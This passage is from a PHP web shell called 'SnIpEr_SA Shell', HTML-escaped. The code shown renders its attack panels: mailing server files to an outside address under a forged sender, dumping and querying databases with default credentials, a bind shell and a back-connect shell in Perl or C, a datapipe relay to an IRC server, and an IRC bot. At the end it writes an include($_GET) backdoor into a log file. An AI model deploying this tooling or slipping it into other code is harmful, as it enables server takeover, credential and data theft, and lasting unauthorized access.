echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text104']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(25,"&lt;b&gt;".$lang[$language.'_text105'].$arrow."&lt;/b&gt;",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text106'].$arrow."&lt;/b&gt;",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text107'].$arrow."&lt;/b&gt;",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from sniper_sa shell"))));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text18'].$arrow."&lt;/b&gt;",in('text','loc_file',45,$dir));
echo sr(25,"&lt;b&gt;".$lang[$language.'_text91'].$arrow."&lt;/b&gt;",in('radio','compress',0,'none',1).' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '&lt;select name=db&gt;';
if($mysql_on) $select .= '&lt;option&gt;MySQL&lt;/option&gt;';
if($mssql_on) $select .= '&lt;option&gt;MSSQL&lt;/option&gt;';
if($pg_on)    $select .= '&lt;option&gt;PostgreSQL&lt;/option&gt;';
if($ora_on)   $select .= '&lt;option&gt;Oracle&lt;/option&gt;';
$select .= '&lt;/select&gt;';
echo $table_up1.div_title($lang[$language.'_text82'],'id20').$table_up2.div('id20').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text40']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' &lt;b&gt;.&lt;/b&gt; '.in('text','mysql_tbl',15,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."&lt;b&gt;".$lang[$language.'_text41'].$arrow."&lt;/b&gt;",in('checkbox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=50%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text83']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(35,"&lt;b&gt;".$lang[$language.'_text80'].$arrow."&lt;/b&gt;",$select);
echo sr(35,"&lt;b&gt;".$lang[$language.'_text111'].$arrow."&lt;/b&gt;",in('text','db_server',15,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','db_port',15,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."&lt;/b&gt;",in('text','mysql_l',15,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' &lt;b&gt;:&lt;/b&gt; '.in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text39'].$arrow."&lt;/b&gt;",in('text','mysql_db',15,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"&lt;b&gt;".$lang[$language.'_text84'].$arrow."&lt;/b&gt;".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."&lt;div align=center id='n'&gt;&lt;textarea cols=55 rows=1 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."&lt;/textarea&gt;&lt;br&gt;".in('submit','submit',0,$lang[$language.'_butt1'])."&lt;/div&gt;&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if(!$safe_mode&&$unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text9']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text10'].$arrow."&lt;/b&gt;",in('text','port',15,'9999'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text11'].$arrow."&lt;/b&gt;",in('text','bind_pass',15,'SnIpEr'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text12']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text13'].$arrow."&lt;/b&gt;",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;",in('text','port',15,'80'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;option value=\"C\"&gt;C&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text22']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text23'].$arrow."&lt;/b&gt;",in('text','local_port',15,'80'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text24'].$arrow."&lt;/b&gt;",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text25'].$arrow."&lt;/b&gt;",in('text','remote_port',15,'6667'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text26'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;datapipe.pl&lt;/option&gt;&lt;option value=\"C\"&gt;datapipe.c&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
if($unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text9']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text10'].$arrow."&lt;/b&gt;",in('text','port1',35,'9999').ws(4).in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
echo $table_up1.div_title($lang[$language.'_text81'],'id21').$table_up2.div('id21').$ts."&lt;tr&gt;".$fs."&lt;td valign=top width=34%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text12']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text214'].$arrow."&lt;/b&gt;",in('text','ircadmin',15,'ircadmin'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text215'].$arrow."&lt;/b&gt;",in('text','ircserver',15,'ircserver'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text216'].$arrow."&lt;/b&gt;",in('text','ircchanal',15,'ircchanl'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text217'].$arrow."&lt;/b&gt;",in('text','ircname',15,'ircname'));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."&lt;/td&gt;".$fe.$fs."&lt;td valign=top width=33%&gt;".$ts;
echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center id='n'&gt;".$lang[$language.'_text12']."&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;";
echo sr(40,"&lt;b&gt;".$lang[$language.'_text13'].$arrow."&lt;/b&gt;",in('text','ips',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;",in('text','ports',15,'80'));
echo sr(40,"&lt;b&gt;".$lang[$language.'_text20'].$arrow."&lt;/b&gt;","&lt;select size=\"1\" name=\"use\"&gt;&lt;option value=\"Perl\"&gt;Perl&lt;/option&gt;&lt;/select&gt;".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
}
echo '&lt;/table&gt;'.$table_up3."&lt;/div&gt;&lt;/div&gt;&lt;div align=center id='n'&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;o---[ SnIpEr_SA Shell  | &lt;a href=http://sniper-sa.com&gt;http://sniper-sa.com&lt;/a&gt; | &lt;a SnIpEr.SA@hotmail.com&gt;sniper.sa@hotmail.com&lt;/a&gt; | ????? ?????? ]---o&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;".$f;
if(empty($_POST['log'])){
} else {
$log=$_POST['log'];
echo  error_log("&lt;? print include(\$_GET[ss]) ?&gt;", 3,$log);
echo "&lt;/textarea&gt;&lt;/CENTER&gt;";
}
?&gt;
</pre>